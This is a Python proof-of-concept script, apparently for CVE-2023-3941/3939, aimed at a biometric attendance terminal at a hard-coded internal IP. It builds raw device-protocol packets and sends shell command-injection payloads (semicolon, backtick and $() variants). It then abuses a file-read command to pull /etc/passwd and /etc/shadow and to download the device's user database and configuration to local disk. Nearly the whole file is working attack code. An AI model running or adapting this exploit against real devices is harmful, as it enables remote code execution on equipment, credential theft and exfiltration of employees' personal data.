#!/usr/bin/env python3
"""Definitive CVE-2023-3941/3939 verification."""
import sys
sys.path.insert(0, 'D:\\chamcong\\AttendanceSuite_Portable\\python\\Lib\\site-packages')
sys.stdout.reconfigure(encoding='utf-8')

import socket, struct, time, random, string
from zk import ZK, const
from struct import pack, unpack

MARKER = "mvs" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
print('[*] Marker:', MARKER)

INJECTIONS = [
    ('echo ' + MARKER + ' > /tmp/mavis_rce_proof', 0),
    ('; echo ' + MARKER + ' > /tmp/mavis_rce_proof2 ;', 0),
    ('`echo ' + MARKER + '` > /tmp/mavis_rce_proof3', 0),
    ('$(echo ' + MARKER + ') > /tmp/mavis_rce_proof4', 0),
]

def make_raw_pkt(command, session_id, reply_id, data=b''):
    body = data
    p = unpack('8B' + ('%sB' % len(body)), pack('<4H', command, 0, session_id, reply_id) + body)
    checksum = 0
    l = len(p)
    pp = list(p)
    while l > 1:
        checksum += unpack('H', pack('BB', pp[0], pp[1]))[0]
        pp = pp[2:]
        if checksum > const.USHRT_MAX:
            checksum -= const.USHRT_MAX
        l -= 2
    if l:
        checksum += pp[-1]
    while checksum > const.USHRT_MAX:
        checksum -= const.USHRT_MAX
    checksum = (~checksum) & const.USHRT_MAX
    reply_id += 1
    if reply_id >= const.USHRT_MAX:
        reply_id -= const.USHRT_MAX
    pkt_body = pack('<4H', command, checksum, session_id, reply_id) + body
    pkt_top = pack('<HHI', const.MACHINE_PREPARE_DATA_1, const.MACHINE_PREPARE_DATA_2, len(pkt_body))
    return pkt_top + pkt_body, reply_id

def recv_all(sock, timeout_s=5, max_size=10*1024*1024):
    sock.settimeout(timeout_s)
    data = b''
    try:
        while True:
            chunk = sock.recv(8192)
            if not chunk:
                break
            data += chunk
            if len(data) >= max_size:
                break
    except socket.timeout:
        pass
    except Exception:
        pass
    return data

def parse_resp(data):
    if not data or len(data) < 16:
        return 0, 0, b''
    top1, top2, tcp_len = unpack('<HHI', data[:8])
    zk_cmd, _, _, _ = unpack('<HHHH', data[8:16])
    body = data[16:16+(tcp_len - 8)]
    return zk_cmd, tcp_len, body

def cmd_str(c):
    if c is None: return '0x0000'
    return '0x%04X' % (c or 0)

zk = ZK('172.16.0.214', port=4370, timeout=10, password=0)
conn = zk.connect()
print('[+] Connected:', conn.get_firmware_version(), conn.get_platform())

try:
    conn.disable_device()
except: pass

sock = conn._ZK__sock
session_id = conn._ZK__session_id
reply_id = conn._ZK__reply_id

print('\n[PHASE 1] Send 4 cmd injection variants via 0x03F5')
for inj_str, _ in INJECTIONS:
    inj_bytes = inj_str.encode() + b'\x00'
    pkt, reply_id = make_raw_pkt(0x03F5, session_id, reply_id, inj_bytes)
    sock.send(pkt)
    resp = recv_all(sock, timeout_s=2)
    cmd, tlen, body = parse_resp(resp)
    print('  Injection:', inj_str[:60])
    print('    cmd=', cmd_str(cmd), 'tcp_len=', tlen)

time.sleep(3)

print('\n[PHASE 2] Verify RCE by reading /tmp/mavis_rce_proof* via READFILE 0x6A6')
for marker_file in ['/tmp/mavis_rce_proof', '/tmp/mavis_rce_proof2',
                     '/tmp/mavis_rce_proof3', '/tmp/mavis_rce_proof4']:
    pkt, reply_id = make_raw_pkt(0x6A6, session_id, reply_id, (marker_file + '\x00').encode())
    sock.send(pkt)
    resp = recv_all(sock, timeout_s=3)
    cmd, tlen, body = parse_resp(resp)
    found = MARKER.encode() in body if body else False
    print('  READ', marker_file, '-> cmd=', cmd_str(cmd), 'tlen=', tlen, 'body_len=', len(body), 'RCE=' + ('YES' if found else 'no'))

print('\n[PHASE 3] Read /etc/passwd')
pkt, reply_id = make_raw_pkt(0x6A6, session_id, reply_id, b'/etc/passwd\x00')
sock.send(pkt)
resp = recv_all(sock, timeout_s=5, max_size=2*1024*1024)
cmd, tlen, body = parse_resp(resp)
print('  /etc/passwd: cmd=', cmd_str(cmd), 'tcp_len=', tlen, 'body_len=', len(body))
if body:
    txt = body.decode('ascii', errors='replace')
    print('  Content first 15 lines:')
    for line in txt.split('\n')[:15]:
        print('   ', line)

print('\n[PHASE 4] Read /etc/shadow')
pkt, reply_id = make_raw_pkt(0x6A6, session_id, reply_id, b'/etc/shadow\x00')
sock.send(pkt)
resp = recv_all(sock, timeout_s=5)
cmd, tlen, body = parse_resp(resp)
print('  /etc/shadow: cmd=', cmd_str(cmd), 'tcp_len=', tlen, 'body_len=', len(body))
if body:
    print('  Content:', body[:300])

print('\n[PHASE 5] Read /mnt/mtdblock/data/ZKDB.db')
pkt, reply_id = make_raw_pkt(0x6A6, session_id, reply_id, b'/mnt/mtdblock/data/ZKDB.db\x00')
sock.send(pkt)
resp = recv_all(sock, timeout_s=15, max_size=10*1024*1024)
cmd, tlen, body = parse_resp(resp)
print('  ZKDB.db: cmd=', cmd_str(cmd), 'tcp_len=', tlen, 'body_len=', len(body))
if body and len(body) > 100:
    out = 'D:\\chamcong\\zk_remote_zkdb_' + str(int(time.time())) + '.db'
    with open(out, 'wb') as f:
        f.write(body)
    print('  [SAVED]', out, 'size=', len(body))
    print('  First 16:', body[:16])

print('\n[PHASE 6] Read /mnt/mtdblock/options.cfg (device config)')
pkt, reply_id = make_raw_pkt(0x6A6, session_id, reply_id, b'/mnt/mtdblock/options.cfg\x00')
sock.send(pkt)
resp = recv_all(sock, timeout_s=5)
cmd, tlen, body = parse_resp(resp)
print('  options.cfg: cmd=', cmd_str(cmd), 'body_len=', len(body))
if body:
    print('  Content:', body[:500])

try:
    conn.enable_device()
except: pass
try:
    conn.disconnect()
except: pass
print('\n[+] Done')
